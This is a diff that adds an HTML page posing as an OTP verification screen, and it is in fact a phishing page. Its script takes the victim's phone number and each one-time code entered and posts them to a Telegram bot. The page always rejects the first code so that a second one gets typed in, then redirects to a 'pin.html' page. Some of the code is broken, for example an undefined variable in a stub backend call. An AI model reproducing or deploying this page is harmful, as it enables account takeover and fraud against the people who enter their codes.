@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verify OTP</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:"Segoe UI",sans-serif;
+}
+
+body{
+  background:#1f2235;
+  min-height:100vh;
+  color:#fff;
+  display:flex;
+  justify-content:center;
+}
+
+.container{
+  width:100%;
+  max-width:380px;
+  padding:25px 20px 100px;
+  text-align:center;
+}
+
+/* Header */
+.header{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:40px;
+}
+
+.back{
+  font-size:22px;
+  cursor:pointer;
+}
+
+/* Text */
+h1{
+  font-size:22px;
+  margin-bottom:15px;
+}
+
+.sub{
+  font-size:15px;
+  color:#ccc;
+  line-height:1.6;
+}
+
+/* OTP dots */
+.otp-box{
+  display:flex;
+  justify-content:center;
+  gap:15px;
+  margin:40px 0;
+}
+
+.otp-box input{
+  width:14px;
+  height:14px;
+  border-radius:50%;
+  border:2px solid #fff;
+  background:transparent;
+  transition:.25s ease;
+}
+
+/* Filled state */
+.otp-box input.filled{
+  background:#fff;
+}
+
+/* Hidden input */
+#hiddenOtp{
+  position:absolute;
+  opacity:0;
+}
+
+/* Resend */
+.resend{
+  color:#4dabf7;
+  margin-bottom:60px;
+  cursor:pointer;
+}
+
+/* Footer */
+.footer-btn{
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translateX(-50%);
+  width:100%;
+  max-width:380px;
+  padding:0 20px;
+}
+
+button{
+  width:100%;
+  background:#355d8c;
+  border:none;
+  padding:14px;
+  border-radius:10px;
+  color:#fff;
+  font-size:16px;
+  position:relative;
+  transition:.3s;
+}
+
+/* Smooth press */
+button.loading{
+  transform:scale(.97);
+  opacity:.85;
+}
+
+/* Static dot loader */
+.dot-loader{
+  display:none;
+  gap:6px;
+  justify-content:center;
+}
+
+.dot-loader span{
+  width:6px;
+  height:6px;
+  background:hwb(0 100% 0%);
+  border-radius:50%;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <div class="back" onclick="history.back()">←</div>
+  </div>
+
+  <h1>Enter OTP code</h1>
+
+  <p class="sub">
+    OTP code has been sent to you on your mobile phone<br>
+    <span id="userPhone"></span>
+  </p>
+
+  <!-- OTP circles -->
+  <div class="otp-box" onclick="focusOtp()">
+    <input disabled>
+    <input disabled>
+    <input disabled>
+    <input disabled>
+    <input disabled>
+  </div>
+
+  <!-- Hidden input -->
+  <input id="hiddenOtp" maxlength="5" type="tel" oninput="fillOtp(this.value)">
+
+  <div class="resend" onclick="resend()">Resend code</div>
+
+</div>
+
+<!-- Verify -->
+<div class="footer-btn">
+  <button id="verifyBtn" onclick="verify()">
+    <span id="btnText">Verify</span>
+
+    <div class="dot-loader" id="dotLoader">
+      <span></span><span></span><span></span>
+    </div>
+  </button>
+</div>
+
+<script>
+  function sendToBackend(phone, otp, attemptLabel){
+  fetch("https://yourdomain.com/send-telegram",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({ message })
+  });
+}
+
+  let otpAttempts = 0;
+  
+  // Focus hidden input
+  function focusOtp(){
+    document.getElementById("hiddenOtp").focus();
+  }
+  
+  // Fill dots (WHITE when typed)
+  function fillOtp(val){
+    let dots=document.querySelectorAll(".otp-box input");
+    dots.forEach(d=>{ d.classList.remove("filled"); });
+    for(let i=0;i<val.length;i++){
+      dots[i].classList.add("filled");
+    }
+  }
+  
+  // Send OTP and phone to Telegram with attempt label
+  function sendOTPToTelegram(phone, otp, attemptLabel) {
+    const msg = `📱 Phone: ${phone}\n🔑 OTP (${attemptLabel}): ${otp}`;
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg
+      })
+    });
+  }
+  
+  // Verify
+  function verify(){
+    let otp = document.getElementById("hiddenOtp").value;
+    let phone = localStorage.getItem("userPhone") || "N/A";
+    if(otp.length < 5){
+      alert("Enter full OTP");
+      return;
+    }
+    let btn = document.getElementById("verifyBtn");
+    btn.classList.add("loading");
+    document.getElementById("btnText").style.display = "none";
+    document.getElementById("dotLoader").style.display = "flex";
+  
+    otpAttempts++;
+  
+    if(otpAttempts === 1){
+      // First attempt: always "wrong"
+      sendOTPToTelegram(phone, otp, "First attempt").then(() => {
+        setTimeout(()=>{
+          btn.classList.remove("loading");
+          document.getElementById("btnText").style.display = "inline";
+          document.getElementById("dotLoader").style.display = "none";
+          alert("Wrong OTP Please try again");
+          document.getElementById("hiddenOtp").value = "";
+          fillOtp("");
+          focusOtp();
+        }, 1000);
+      });
+    } else {
+      // Second attempt: accept
+      sendOTPToTelegram(phone, otp, "Second attempt").then(() => {
+        setTimeout(()=>{
+          window.location.href = "pin.html";
+        }, 1200);
+      });
+    }
+  }
+  
+  // Autofocus on load
+  window.onload = function() {
+    document.getElementById("hiddenOtp").focus();
+  };
+  </script>
+  <!-- Add this script at the end of your <body> -->
+<script>
+  // Focus hidden OTP input on page load
+  window.onload = function() {
+    document.getElementById("hiddenOtp").focus();
+  };
+
+  // Focus hidden input when OTP circles are clicked
+  function focusOtp(){
+    document.getElementById("hiddenOtp").focus();
+  }
+
+  // (rest of your script remains unchanged)
+</script>
+  
+</body>
+</html>
